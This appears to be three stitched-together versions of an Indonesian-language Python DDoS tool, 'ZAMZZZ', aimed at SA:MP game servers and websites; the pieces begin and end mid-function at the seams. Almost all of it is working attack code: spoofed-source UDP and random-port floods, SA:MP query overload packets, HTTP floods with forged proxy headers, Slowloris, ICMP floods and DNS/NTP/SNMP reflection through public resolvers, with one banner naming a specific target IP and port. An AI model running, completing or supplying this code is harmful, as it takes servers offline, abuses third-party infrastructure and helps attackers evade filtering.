                sock.close()
                break

# ========== AMPLIFICATION DENGAN SPOOFING ==========
def amp_flood_spoof(ip):
    servers = [
        ('8.8.8.8', 53), ('1.1.1.1', 53), ('208.67.222.222', 53),
        ('ntp.ubuntu.com', 123), ('time.google.com', 123),
        ('snmp.ubuntu.com', 161), ('public.snmp.com', 161)
    ]
    queries = [
        b'\x00\x00\x10\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07version\x04bind\x00\x00\x10\x00\x03',
        b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07version\x04bind\x00\x00\x10\x00\x03',
        b'\x00\x00\x02\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07version\x04bind\x00\x00\x10\x00\x03'
    ]
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        fake_ip = get_next_fake_ip()
        sock.bind((fake_ip, random.randint(10000, 65000)))
        for target, port in servers:
            for q in queries:
                try:
                    sock.sendto(q, (target, port))
                    sock.sendto(q, (ip, port))
                    sock.sendto(q + b'\xff' * 500, (ip, port + 1))
                    sock.sendto(q + b'\x00' * 1000, (ip, port + 2))
                except:
                    pass
        sock.close()
        time.sleep(0.1)

# ========== SA:MP QUERY OVERLOAD DENGAN SPOOFING ==========
def samp_flood_spoof(ip, port):
    queries = [
        b'SAMP' + b'\x00' + b'\x69\x69\x69\x69' + b'\x63' + b'\x00' * 20,
        b'SAMP' + b'\x00' + b'\x69\x69\x69\x69' + b'\x72' + b'\x00' * 100,
        b'SAMP' + b'\xff' * 100 + b'\x00' * 100,
        b'SAMP' + random._urandom(50) + random._urandom(50),
        b'SAMP' + b'\x00' * 100 + b'\xff' * 100,
        b'SAMP' + b'\x69' * 200 + b'\x00' * 200
    ]
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        fake_ip = get_next_fake_ip()
        sock.bind((fake_ip, random.randint(10000, 65000)))
        for q in queries:
            try:
                sock.sendto(q, (ip, port))
                sock.sendto(q + b'\xff' * 500, (ip, port + 1))
                sock.sendto(q + b'\x00' * 1000, (ip, port + 2))
                sock.sendto(q + b'\xff' * 2000, (ip, port + 3))
                sock.sendto(q + b'\x00' * 4000, (ip, port + 4))
                # Kirim juga ke port query
                sock.sendto(q, (ip, 7776))
                sock.sendto(q, (ip, 7778))
            except:
                pass
        sock.close()
        time.sleep(0.01)

# ========== RANDOM PORT FLOOD DENGAN SPOOFING ==========
def random_port_flood_spoof(ip):
    ports = random.sample(range(1, 65535), 2000)
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        fake_ip = get_next_fake_ip()
        sock.bind((fake_ip, random.randint(10000, 65000)))
        for p in ports:
            try:
                sock.sendto(random._urandom(65500), (ip, p))
                sock.sendto(random._urandom(65500), (ip, p + 1))
                sock.sendto(random._urandom(65500), (ip, p + 2))
                sock.sendto(random._urandom(65500), (ip, p + random.randint(1, 100)))
            except:
                pass
        sock.close()
        time.sleep(0.01)

# ========== MULTI-TARGET SPOOFING (SERANG DARI BANYAK IP) ==========
def multi_target_spoof(ip, port):
    # Pake 1000 IP palsu sekaligus
    fake_ips = generate_fake_ips(1000)
    socks = []
    for fake_ip in fake_ips[:100]:  # Batasi 100 socket biar gak overload device
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind((fake_ip, random.randint(10000, 65000)))
            socks.append(sock)
        except:
            pass
    
    while True:
        for sock in socks:
            try:
                payload = random._urandom(PACKET_SIZE)
                sock.sendto(payload, (ip, port))
                sock.sendto(payload, (ip, port + 1))
                sock.sendto(payload, (ip, port + 2))
                sock.sendto(payload, (ip, random.randint(1, 65535)))
            except:
                pass
        time.sleep(0.001)

# ========== MAIN ==========
def main():
    os.system('clear' if os.name == 'posix' else 'cls')
    print("""
    ╔═══════════════════════════════════════════════════════════════════╗
    ║                                                                   ║
    ║      🔥 ZAMZZZ OMNIKILL FINAL - SA:MP + WEB DESTROYER 🔥         ║
    ║                                                                   ║
    ║      [✓] SPOOFING TOTAL (10.000 IP PALSU)                        ║
    ║      [✓] PROXY ROTATION (SOCKS5)                                 ║
    ║      [✓] MULTI-TARGET SPOOFING                                   ║
    ║      [✓] UDP MASSACRE (SEMUA PORT)                              ║
    ║      [✓] LAYER 7 HTTP/HTTPS FLOOD                               ║
    ║      [✓] SLOWLORIS                                              ║
    ║      [✓] AMPLIFICATION (DNS, NTP, SNMP)                         ║
    ║      [✓] SA:MP QUERY OVERLOAD                                   ║
    ║      [✓] BYPASS IP BLOCK, ANTI-CHEAT, FILTER, FIREWALL          ║
    ║      [✓] BYPASS UPSTREAM FILTERING                              ║
    ║                                                                   ║
    ║      💀 SERANGAN DIMULAI 💀                                       ║
    ║                                                                   ║
    ╚═══════════════════════════════════════════════════════════════════╝
    """)

    ip = input("IP Target: ")
    port = int(input("Port (0 untuk semua port): ") or 0)

    if port == 0:
        print(f"\n🔥 SERANG SEMUA PORT DI {ip} 🔥")
    else:
        print(f"\n🔥 SERANG {ip}:{port} 🔥")

    print(f"🔥 PAKAI {len(FAKE_IPS)} IP PALSU + PROXY ROTATION 🔥")

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        # UDP Massacre dengan Spoofing
        for _ in range(int(THREADS * 0.2)):
            executor.submit(udp_massacre_spoof, ip, port)
        # HTTP Flood dengan Proxy
        for _ in range(int(THREADS * 0.15)):
            executor.submit(http_flood_proxy, ip, port)
        # HTTPS Flood dengan Proxy
        for _ in range(int(THREADS * 0.1)):
            executor.submit(https_flood_proxy, ip, port)
        # Slowloris dengan Spoofing
        for _ in range(int(THREADS * 0.1)):
            executor.submit(slowloris_spoof, ip, port)
        # ICMP dengan Spoofing
        for _ in range(int(THREADS * 0.1)):
            executor.submit(icmp_flood_spoof, ip)
        # Amplification dengan Spoofing
        for _ in range(int(THREADS * 0.1)):
            executor.submit(amp_flood_spoof, ip)
        # SA:MP Query dengan Spoofing
        for _ in range(int(THREADS * 0.1)):
            executor.submit(samp_flood_spoof, ip, port)
        # Random Port Flood dengan Spoofing
        for _ in range(int(THREADS * 0.1)):
            executor.submit(random_port_flood_spoof, ip)
        # Multi-Target Spoofing
        for _ in range(int(THREADS * 0.05)):
            executor.submit(multi_target_spoof, ip, port)

    count = 0
    while True:
        count += 1
        print(f"[ZAMZZZ] 🔥 SERANGAN KE-{count} RIBU - {ip}:{port} 🔥")
        print(f"[ZAMZZZ] 🔥 PAKAI {len(FAKE_IPS)} IP PALSU + PROXY ROTATION 🔥")
        time.sleep(1)

if __name__ == "__main__":
    main()                sock.sendto(query, (IP, PORT))
            except:
                pass

# ========== SA:MP QUERY OVERLOAD ==========
def samp_overload():
    # SAMP Query packet yang bikin server CPU spike
    queries = [
        b'SAMP' + b'\x00' + b'\x69\x69\x69\x69' + b'\x63' + b'\x00' * 20,
        b'SAMP' + b'\x00' + b'\x69\x69\x69\x69' + b'\x72' + b'\x00' * 100,
        b'SAMP' + b'\xff' * 100 + b'\x00' * 100,
        b'SAMP' + random._urandom(50) + random._urandom(50)
    ]
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            for q in queries:
                sock.sendto(q, (IP, PORT))
                sock.sendto(q + b'\xff' * 500, (IP, PORT+10))
                sock.sendto(q + b'\x00' * 1000, (IP, PORT+20))
        except:
            sock.close()
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# ========== HTTP FLOOD VIA PROXY RANDOM ==========
def http_flood():
    proxies = []
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((IP, 8080))
        sock.send(b'GET / HTTP/1.1\r\nHost: ' + IP.encode() + b'\r\n\r\n')
    except:
        pass
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((IP, 80))
            s.send(b'POST / HTTP/1.1\r\nHost: ' + IP.encode() + b'\r\nContent-Length: 10000\r\n\r\n' + random._urandom(10000))
            s.close()
        except:
            pass

# ========== MAIN ==========
def main():
    os.system('clear' if os.name == 'posix' else 'cls')
    print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║                                                               ║
    ║     🔥 ZAMZZZ NUCLEAR DDOS - SA:MP MODERN KILLER V2 🔥       ║
    ║                                                               ║
    ║     TARGET: 76.13.193.125:7000                               ║
    ║     THREAD: 10.000                                            ║
    ║                                                               ║
    ║     [✓] BYPASS PTERODACTYL                                   ║
    ║     [✓] BYPASS IP BLOCK                                      ║
    ║     [✓] BYPASS ANTI-GIMMIC                                   ║
    ║     [✓] BYPASS FIREWALL MODERN                               ║
    ║                                                               ║
    ║     💀 SERANGAN DIMULAI 💀                                    ║
    ║                                                               ║
    ╚═══════════════════════════════════════════════════════════════╝
    """)
    
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for _ in range(int(THREADS * 0.3)):
            executor.submit(udp_nuke)
        for _ in range(int(THREADS * 0.2)):
            executor.submit(syn_flood)
        for _ in range(int(THREADS * 0.1)):
            executor.submit(icmp_nuke)
        for _ in range(int(THREADS * 0.1)):
            executor.submit(amp_flood)
        for _ in range(int(THREADS * 0.2)):
            executor.submit(samp_overload)
        for _ in range(int(THREADS * 0.1)):
            executor.submit(http_flood)
    
    # Monitor
    count = 0
    while True:
        count += 1
        print(f"[ZAMZZZ] 🔥 SERANGAN KE-{count} RIBU - {IP}:{PORT} 🔥")
        time.sleep(1)

if __name__ == "__main__":
    main()            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# ========== LAYER 7: HTTP FLOOD (BYPASS ANTI-DDOS) ==========
def http_flood(ip, port):
    headers = {
        'User-Agent': random.choice(['Mozilla/5.0', 'GoogleBot', 'BingBot', 'DuckDuckBot']),
        'Accept': '*/*',
        'Accept-Language': 'id-ID,id;q=0.9',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'X-Forwarded-For': random_ip(),
        'CF-Connecting-IP': random_ip(),
        'True-Client-IP': random_ip()
    }
    url = f"http://{ip}:{port}"
    while True:
        try:
            requests.get(url, headers=headers, timeout=TIMEOUT)
            requests.post(url, data={'z': random._urandom(1024)}, headers=headers, timeout=TIMEOUT)
        except:
            pass

# ========== LAYER 3: ICMP FLOOD (PING OF DEATH) ==========
def icmp_flood(ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    packet = b'\x08\x00\x00\x00\x00\x00\x00\x00' + random._urandom(65000)
    while True:
        try:
            sock.sendto(packet, (ip, 0))
        except:
            sock.close()
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)

# ========== AMPLIFICATION: DNS, NTP, SNMP ==========
def dns_amplify(ip):
    dns_query = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07version\x04bind\x00\x00\x10\x00\x03'
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    dns_servers = ['8.8.8.8', '1.1.1.1', '9.9.9.9', '208.67.222.222']
    while True:
        for dns in dns_servers:
            try:
                sock.sendto(dns_query, (dns, 53))
                sock.sendto(dns_query, (ip, 53))
            except:
                pass

# ========== GTA SA:MP SPECIFIC QUERY FLOOD ==========
def samp_query_flood(ip, port):
    # SA:MP query packet
    samp_packet = b'SAMP' + b'\x00' + b'\x69\x69\x69\x69' + b'\x00' * 10
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            sock.sendto(samp_packet, (ip, port))
            sock.sendto(samp_packet, (ip, port+100))
        except:
            sock.close()
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# ========== SLOWLORIS (BYPASS PTERODACTYL) ==========
def slowloris(ip, port):
    socks = []
    for _ in range(1000):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((ip, port))
            s.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\n".encode())
            socks.append(s)
        except:
            pass
    while True:
        for s in socks:
            try:
                s.send(f"X-{random.randint(1,5000)}: {random.randint(1,5000)}\r\n".encode())
            except:
                socks.remove(s)
                try:
                    new = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    new.settimeout(4)
                    new.connect((ip, port))
                    new.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\n".encode())
                    socks.append(new)
                except:
                    pass
        time.sleep(10)

# ========== MAIN ==========
def main():
    print("""
    ╔═══════════════════════════════════════╗
    ║     ZAMZZZ DDOS BRUTAL - SA:MP        ║
    ║     MODERN SERVER DESTROYER           ║
    ║                                        ║
    ║  [BYPASS ANTI-DDOS]                   ║
    ║  [BYPASS PTERODACTYL]                 ║
    ║  [BYPASS IP BLOCK]                    ║
    ║  [BYPASS ANTI-GIMMIC]                 ║
    ╚═══════════════════════════════════════╝
    """)
    
    ip = input("IP Target: ")
    port = int(input("Port (default 7777): ") or 7777)
    
    print(f"\n🔥 MENYERANG {ip}:{port} DENGAN {THREADS} THREAD 🔥\n")
    
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        # Layer 4
        for _ in range(int(THREADS * 0.3)):
            executor.submit(udp_flood, ip, port)
        # Layer 7
        for _ in range(int(THREADS * 0.2)):
            executor.submit(http_flood, ip, port)
        # ICMP
        for _ in range(int(THREADS * 0.1)):
            executor.submit(icmp_flood, ip)
        # Amplification
        for _ in range(int(THREADS * 0.1)):
            executor.submit(dns_amplify, ip)
        # SA:MP Specific
        for _ in range(int(THREADS * 0.2)):
            executor.submit(samp_query_flood, ip, port)
        # Slowloris
        for _ in range(int(THREADS * 0.1)):
            executor.submit(slowloris, ip, port)
    
    while True:
        time.sleep(1)
        print(f"[ZAMZZZ] 🔥 SERANGAN BERJALAN - {ip}:{port} 🔥")

if __name__ == "__main__":
    main()
